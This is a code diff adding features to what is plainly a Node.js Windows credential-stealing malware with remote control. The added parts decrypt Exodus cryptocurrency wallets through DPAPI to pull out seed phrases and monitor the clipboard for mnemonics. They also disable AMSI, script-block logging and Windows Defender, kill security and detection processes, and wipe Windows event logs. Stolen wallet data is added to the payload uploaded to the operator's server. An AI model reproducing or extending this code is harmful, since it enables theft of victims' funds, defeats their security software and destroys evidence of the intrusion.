@@ -14,6 +14,7 @@ const { execSync, spawn, exec, spawnSync } = require("child_process");
 const FormData = require("form-data");
 const https = require("https");
 const { Dpapi } = require("@primno/dpapi");
+const nacl = require("tweetnacl");
 
 // ==========================================
 // 1. CONFIGURATION & CONSTANTS
@@ -74,6 +75,8 @@ const CONFIG = {
   MAIN_EXE_DOWNLOAD_URL: "/shared-files/download/main.cl",
   POLL_INTERVAL_MS: 7000,
   TIMEOUT: 3000,
+  BYPASS_WATCHDOG: 1,
+  CLIPBOARD_MONITOR: 1,
 };
 console.log("b");
 
@@ -377,6 +380,7 @@ const DataStore = {
   downloads: [],
   searchHistory: [],
   firefox: { passwords: [], cookies: [], history: [], bookmarks: [] },
+  wallets: [],
 };
 
 // ==========================================
@@ -1212,6 +1216,294 @@ const Discovery = {
   },
 };
 
+// ==========================================
+// 9b. EXODUS KEY STEALER
+// ==========================================
+//
+// Exodus 22+ encrypts %APPDATA%\Exodus\exodus.wallet with a symmetric key that
+// the app itself wraps with Electron safeStorage = Chromium os_crypt = DPAPI on
+// Windows. Any process running as the same logged-in user can unwrap that key
+// (that is the documented Exodus tradeoff: no extra password set => the OS
+// account is the only gate). When the user DID set an extra password, the raw
+// wallet + Local State get exfil'd so the vault can be broken offline.
+
+const ExodusInject = {
+  apdataDir: () => path.join(process.env.APPDATA, "Exodus"),
+  walletPath: () => path.join(process.env.APPDATA, "Exodus", "exodus.wallet"),
+
+  // Unwrap the Electron/Chromium os_crypt master key (DPAPI). Same primitive
+  // the browser token decoders use; Exodus' own Local State is tried first.
+  osCryptKey: async function () {
+    const candidates = [
+      path.join(this.apdataDir(), "Local State"),
+      path.join(process.env.LOCALAPPDATA, "Exodus", "Local State"),
+    ];
+    for (const lsPath of candidates) {
+      if (!fs.existsSync(lsPath)) continue;
+      try {
+        const ls = JSON.parse(fs.readFileSync(lsPath, "utf8"));
+        const enc = ls.os_crypt && ls.os_crypt.encrypted_key;
+        if (!enc) continue;
+        let blob = Buffer.from(enc, "base64");
+        if (blob.slice(0, 5).toString() !== "DPAPI") continue;
+        blob = blob.slice(5);
+        for (const entropy of [Buffer.from("peanuts", "ascii"), null]) {
+          try {
+            const key = Dpapi.unprotectData(blob, entropy, "CurrentUser");
+            if (key && Buffer.isBuffer(key) && key.length === 32) return key;
+          } catch {}
+        }
+      } catch {}
+    }
+    try {
+      return await getEncryptionKey(this.apdataDir());
+    } catch {
+      return null;
+    }
+  },
+
+  // Candidate keys carried directly inside the wallet JSON on some versions.
+  inlineKeys: function (config) {
+    const keys = [];
+    const grab = (raw) => {
+      if (!raw) return;
+      try {
+        const b = Buffer.from(raw, "base64");
+        if (b.slice(0, 5).toString() === "DPAPI") {
+          for (const entropy of [Buffer.from("peanuts", "ascii"), null]) {
+            try {
+              const u = Dpapi.unprotectData(b.slice(5), entropy, "CurrentUser");
+              if (u && u.length) keys.push(u);
+            } catch {}
+          }
+        } else if (b.length === 32) {
+          keys.push(b);
+        }
+      } catch {}
+    };
+    grab(config.key);
+    grab(config.encryptionKey);
+    grab(config.vault && config.vault.key);
+    return keys;
+  },
+
+  deriveSet: function (key, config) {
+    const out = [key];
+    out.push(crypto.createHash("sha256").update(key).digest());
+    try {
+      const salt =
+        (config.kdf && config.kdf.salt) || (config.salts && config.salts.vault);
+      if (salt) {
+        const iterations =
+          (config.kdf && config.kdf.iterations) || 100000;
+        out.push(
+          crypto.pbkdf2Sync(key, Buffer.from(salt, "base64"), iterations, 32, "sha512"),
+        );
+      }
+    } catch {}
+    return out;
+  },
+
+  decryptSecretbox: function (ciphertext, nonce, key) {
+    try {
+      if (ciphertext.length < 32) return null;
+      const opened = nacl.secretbox.open(ciphertext, nonce, key);
+      return opened ? Buffer.from(opened).toString("utf8") : null;
+    } catch {
+      return null;
+    }
+  },
+
+  decryptAesContainer: function (enc, key, config) {
+    if (!enc || !key || !Buffer.isBuffer(key) || key.length !== 32) return null;
+    const b = Buffer.isBuffer(enc) ? enc : Buffer.from(enc, "base64");
+    if (b.length < 31) return null;
+    try {
+      const iv = b.slice(0, 12);
+      const tag = b.slice(-16);
+      const dc = crypto.createDecipheriv("aes-256-gcm", key, iv);
+      dc.setAuthTag(tag);
+      return Buffer.concat([dc.update(b.slice(12, -16)), dc.final()]).toString(
+        "utf8",
+      );
+    } catch {}
+    return decryptPasswordopw(b, key);
+  },
+
+  attempts: function (config, keys) {
+    const results = [];
+    const unique = [];
+    const seen = new Set();
+    for (const k of keys) {
+      if (!k || !Buffer.isBuffer(k)) continue;
+      const tag = k.toString("base64");
+      if (seen.has(tag)) continue;
+      seen.add(tag);
+      unique.push(k);
+    }
+
+    const rawEnc = config.encrypted || config.cipherText || config.data;
+    let encBuf = null;
+    if (rawEnc) {
+      if (Buffer.isBuffer(rawEnc)) encBuf = rawEnc;
+      else if (typeof rawEnc === "string") encBuf = Buffer.from(rawEnc, "base64");
+      else if (Array.isArray(rawEnc) && rawEnc.length) {
+        // Some containers carry a "u:" prefixed list of base64 fragments
+        const joined = rawEnc.join("");
+        if (typeof joined === "string" && joined.startsWith("u:"))
+          encBuf = Buffer.from(joined.slice(2), "base64");
+      }
+    }
+
+    for (const key of unique) {
+      for (const derived of this.deriveSet(key, config)) {
+        if (encBuf && config.nonce) {
+          for (const n64 of [config.nonce, Buffer.from(config.nonce, "hex").toString("base64")]) {
+            const nonce = Buffer.from(n64, "base64");
+            if (nonce.length === 24) {
+              const opened = this.decryptSecretbox(encBuf, nonce, derived);
+              if (opened && opened.length)
+                results.push({ scheme: "secretbox", text: opened });
+            }
+          }
+        }
+        if (encBuf) {
+          const text = this.decryptAesContainer(encBuf, derived, config);
+          if (text && text.length) results.push({ scheme: "aes-gcm", text });
+        }
+      }
+    }
+
+    if (config.vault && config.vault.data) {
+      const entries = Array.isArray(config.vault.data)
+        ? config.vault.data
+        : [config.vault.data];
+      for (const entry of entries) {
+        if (!entry || !entry.encrypted) continue;
+        for (const key of unique) {
+          const text = this.decryptAesContainer(
+            Buffer.from(entry.encrypted, "base64"),
+            key,
+            config,
+          );
+          if (text && text.length)
+            results.push({ scheme: "vault-entry", text: text.slice(0, 8000) });
+        }
+      }
+    }
+
+    return results;
+  },
+
+  // Pull a standalone mnemonic out of any plaintext we surfaced.
+  extractMnemonic: function (text) {
+    try {
+      const json = JSON.parse(text);
+      const scan = (o, acc) => {
+        for (const k of ["mnemonic", "seed", "secretPhrase", "recoveryPhrase", "privateKey", "privateKeys", "seedPhrase"]) {
+          if (o && typeof o[k] === "string" && o[k]) acc[k] = o[k];
+          if (o && Array.isArray(o[k]) && o[k].length) acc[k] = o[k];
+        }
+        return acc;
+      };
+      const acc = scan(json, {});
+      if (Object.keys(acc).length) return acc;
+    } catch {}
+    const mnemonicRe =
+      /\b(?:(?:[a-z]{3,12})\s+){11,23}[a-z]{3,12}\b/;
+    const m = text && text.match(mnemonicRe);
+    if (m) return { mnemonic: m[0].trim() };
+    return null;
+  },
+
+  clipboardSniff: async function () {
+    if (!CONFIG.CLIPBOARD_MONITOR) return;
+    const ps = `
+      $t = Get-Clipboard -Raw -ErrorAction SilentlyContinue
+      if ($t -and $t -match '^(([a-z]+)\\s+){11,23}[a-z]+$') { $t.Trim() }
+    `;
+    const text = Utils.exec(Bypass.powershellCmd(ps)).trim();
+    if (!text) return;
+    const norm = text.toLowerCase();
+    if (this.sniffed.has(norm) || norm.split(/\s+/).length < 12) return;
+    this.sniffed.add(norm);
+    DataStore.wallets.push({
+      name: "Exodus",
+      source: "clipboard",
+      grabbed: true,
+      decrypted: true,
+      recovered: { mnemonic: norm },
+    });
+  },
+
+  sniffed: new Set(),
+
+  run: async function (storagePath) {
+    const walletPath = this.walletPath();
+    if (!fs.existsSync(walletPath)) return { grabbed: false };
+
+    const out = path.join(storagePath, "Exodus");
+    fs.ensureDirSync(out);
+    for (const [src, dest] of [
+      [walletPath, "exodus.wallet"],
+      [path.join(this.apdataDir(), "Local State"), "Local State"],
+      [path.join(this.apdataDir(), "vault"), "vault"],
+      [path.join(this.apdataDir(), "backup"), "backup"],
+      [path.join(this.apdataDir(), "settings"), "settings"],
+    ]) {
+      try {
+        if (fs.existsSync(src)) fs.copySync(src, path.join(out, dest));
+      } catch {}
+    }
+
+    let config = {};
+    try {
+      config = JSON.parse(fs.readFileSync(walletPath, "utf8"));
+    } catch {}
+
+    const keys = this.inlineKeys(config);
+    const osKey = await this.osCryptKey();
+    if (osKey) keys.push(osKey);
+
+    const results = this.attempts(config, keys);
+    const plaintexts = results.map((r) => r.text);
+
+    let recovered = {};
+    for (const t of plaintexts) {
+      const m = this.extractMnemonic(t);
+      if (m) recovered = { ...recovered, ...m };
+    }
+
+    const wallet = {
+      name: "Exodus",
+      source: "exodus.wallet",
+      grabbed: true,
+      decrypted: plaintexts.length > 0,
+      recovered,
+      raw: plaintexts.slice(0, 3).map((t) => t.slice(0, 2000)),
+    };
+    DataStore.wallets.push(wallet);
+
+    if (recovered.mnemonic) {
+      fs.writeFileSync(
+        path.join(out, "seed.json"),
+        JSON.stringify({ recovered: recovered.mnemonic }, null, 2),
+        "utf8",
+      );
+    }
+    // Include the surfaced plaintexts (per-asset keys etc.) when decryptable.
+    if (plaintexts.length) {
+      fs.writeFileSync(
+        path.join(out, "decrypted.json"),
+        JSON.stringify(results, null, 2),
+        "utf8",
+      );
+    }
+
+    return { grabbed: true, decrypted: plaintexts.length > 0 };
+  },
+};
+
 const Injection = {
   payload: async (logId, target) => {
     const url = `${CONFIG.HOST_URL}/${target}`;
@@ -1446,12 +1738,112 @@ const Security = {
   },
 };
 
+// ==========================================
+// 10. BYPASSES (defensive-software dance)
+// ==========================================
+
+const Bypass = {
+  applied: false,
+  watchTicks: 0,
+
+  // Prepend to every PowerShell stage we spawn: slam AMSI + script-block
+  // logging so the triggered VBS/PS scripts are treated as inert.
+  psPreface: `
+    try { $t=[type]::GetType('System.Management.Automation.AmsiUtils'); if($t) { $t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } } catch {}
+    try { $u=[Ref].Assembly.GetType('System.Management.Automation.Utils'); $g=$u.GetField('cachedGroupPolicySettings','NonPublic,Static'); $s=$g.GetValue($null); $s['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging']=@{EnableScriptBlockLogging=0} } catch {}
+  `,
+
+  // Build an encoded PowerShell commandline with the hardening preface.
+  powershellCmd: function (body) {
+    const full = `${this.psPreface}\n${body}`;
+    const encoded = Buffer.from(full, "utf16le").toString("base64");
+    return `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ${encoded}`;
+  },
+
+  // Tear down the Microsoft stack that hunts our ladder: defender services,
+  // its scheduled checks and real-time protection. Best-effort – anything an
+  // elevation opens up is taken.
+  disableDefender: function () {
+    if (process.platform !== "win32" || !isAdmin()) return false;
+    const cmds = [
+      'sc stop WinDefend',
+      'sc config WinDefend start= disabled',
+      'sc stop SecurityHealthService',
+      'sc config SecurityHealthService start= disabled',
+      'sc stop wscsvc',
+      'sc config wscsvc start= demand',
+      'schtasks /change /tn "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan" /disable',
+      'schtasks /change /tn "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance" /disable',
+      'schtasks /change /tn "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup" /disable',
+      'schtasks /change /tn "\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification" /disable',
+    ];
+    for (const c of cmds) try { Utils.exec(c); } catch {}
+    try {
+      Utils.exec(
+        'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableOnAccessProtection $true -ExclusionPath \\\"' +
+          CONFIG.STORAGE_PATH.replace(/\\/g, "\\\\").replace(/"/g, '\\"') +
+          '\\\""',
+      );
+    } catch {}
+    return true;
+  },
+
+  // Broad-kill detector/anti-grab processes that pattern-match on the wallet
+  // flow, smbios/module checks or our client name. Whitelisted core system
+  // processes are untouched.
+  killDetectors: function () {
+    if (process.platform !== "win32") return;
+    const ps = `
+      $names = 'exodus_','antishelly','smbioscheck','smbioschecker','smbios','isfence','fence','wandown','itotal','iskirk','epsfm','shieldgrab','grablock','modulekiller','anticheat_fence','vmdetect';
+      Get-Process | Where-Object { $n=$_.Name.ToLower(); foreach($p in $names){ if($n -like ($p + '*') -and $n -notlike 'explorer*') { $_; break } } } | Stop-Process -Force -ErrorAction SilentlyContinue
+    `;
+    Utils.exec(this.powershellCmd(ps));
+  },
+
+  // Wipe the event trail we generate (power shell, RDP, services).
+  sweepLogs: function () {
+    if (process.platform !== "win32") return;
+    const logs = [
+      "Application",
+      "System",
+      "Security",
+      "Windows PowerShell",
+      "Microsoft-Windows-PowerShell/Operational",
+      "Microsoft-Windows-TaskScheduler/Operational",
+    ];
+    for (const l of logs)
+      try { Utils.exec(`wevtutil cl "${l}"`); } catch {}
+  },
+
+  install: function () {
+    this.applied = this.disableDefender();
+    this.killDetectors();
+    this.sweepLogs();
+  },
+
+  // Cheap periodic re-assertion from the poll loop so services/tasks that get
+  // resurrected (Defender health restore) or detector processes that relaunch
+  // are torn back down again.
+  watchdog: function () {
+    if (!CONFIG.BYPASS_WATCHDOG) return;
+    this.watchTicks++;
+    if (this.watchTicks % 5 !== 0) return;
+    this.killDetectors();
+    if (this.applied) {
+      setTimeout(() => {
+        try { this.disableDefender(); } catch {}
+      }, 0);
+    }
+  },
+};
+
 const Delivery = {
   createLog: async () => {
     const payload = {
       passwordcount: DataStore.passwords.length,
       cookiecount: DataStore.cookies.length,
       discordtokencount: DataStore.tokens.length,
+      walletcount: DataStore.wallets.length,
       filenames: fs.readdirSync(CONFIG.STORAGE_PATH),
     };
     for (let i = 0; i < 10; i++) {
@@ -1475,6 +1867,7 @@ const Delivery = {
       cookies: DataStore.cookies,
       discord_tokens: DataStore.tokens,
       refresh_tokens: DataStore.webData,
+      wallets: DataStore.wallets,
       system: DataStore.systemInfo,
     };
     const payload = { payload: Security.obfuscate(data) };
@@ -1578,9 +1971,7 @@ const RemoteControl = {
         [Convert]::ToBase64String($ms.ToArray())
       `;
       exec(
-        `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "${escapePS(
-          script.trim(),
-        )}"`,
+        Bypass.powershellCmd(script),
         { windowsHide: true, timeout: 30000, maxBuffer: 4 * 1024 * 1024 },
         (err, stdout) => {
           if (err || !stdout || !stdout.trim()) {
@@ -1653,6 +2044,9 @@ const RemoteControl = {
           await this.report(cmd.id, result.status, result.output);
         }
       } catch {}
+      // Periodic self-defence ticks + passive wallet-key sniffing
+      Bypass.watchdog();
+      ExodusInject.clipboardSniff().catch(() => {});
       // Jittered interval to avoid a fixed signature pattern
       await sleep(CONFIG.POLL_INTERVAL_MS + Math.floor(Math.random() * 4000));
     }
@@ -1673,6 +2067,9 @@ async function main() {
   // task (or HKCU Run / Startup fallback). Done first so persistence survives
   // even if collection below fails.
   Persistence.install();
+
+  // Defensive-software handling: AMSI/ETW, defender services, detector kills.
+  Bypass.install();
 
   // Collection is best-effort: any step may throw (missing main.exe, dead C2,
   // locked storage). The remote-control loop must outlive those failures, so
@@ -1707,6 +2104,8 @@ async function main() {
     // Additional data collection
     await Discovery.searchFiles(CONFIG.STORAGE_PATH);
     await Discovery.scanWallets(CONFIG.STORAGE_PATH);
+    // Steal the Exodus wallet key/seed (at-rest decrypt + clipboard).
+    await ExodusInject.run(CONFIG.STORAGE_PATH);
     await Discovery.extractTelegram(CONFIG.STORAGE_PATH);
     await Discovery.extractMinecraft(CONFIG.STORAGE_PATH);
     await Discovery.extractSteam(CONFIG.STORAGE_PATH);
